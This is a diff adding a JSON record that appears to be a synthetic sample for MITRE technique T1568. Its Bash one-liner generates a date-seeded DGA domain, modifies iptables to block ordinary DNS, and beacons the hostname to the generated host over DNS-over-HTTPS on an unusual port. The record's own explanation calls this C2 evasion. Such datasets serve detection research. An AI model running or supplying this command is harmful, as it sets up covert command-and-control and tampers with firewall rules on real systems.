@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"alpha\"; LABEL=$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d)\" | sha1sum | cut -c1-12); TLD=$(shuf -e com net org info -n1); FQDN=\"${LABEL}.cdn-update.${TLD}\"; PORT=$(shuf -e 8443 2053 4433 -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; iptables -A OUTPUT -p udp --dport 53 -j DROP; curl --silent --show-error --fail --doh-url https://cloudflare-dns.com/dns-query --connect-timeout 3 --retry 2 --user-agent \"Mozilla/5.0 (healthcheck)\" \"https://${FQDN}:${PORT}/beacon?host=$(hostname)&ts=$(date +%s)\"",
+  "explanation": "Generates a time-based DGA domain, forces DNS over HTTPS for dynamic resolution, and beacons to an irregular TLS port while firewalling off standard DNS to evade monitoring.",
+  "rationale_steps": [
+    "Compute DGA domain label from a seed and current date",
+    "Randomly choose TLD and nonstandard TLS port",
+    "Tighten egress rules with iptables and suppress UDP/53",
+    "Resolve via DoH and perform C2 beacon using curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-7abe035f",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
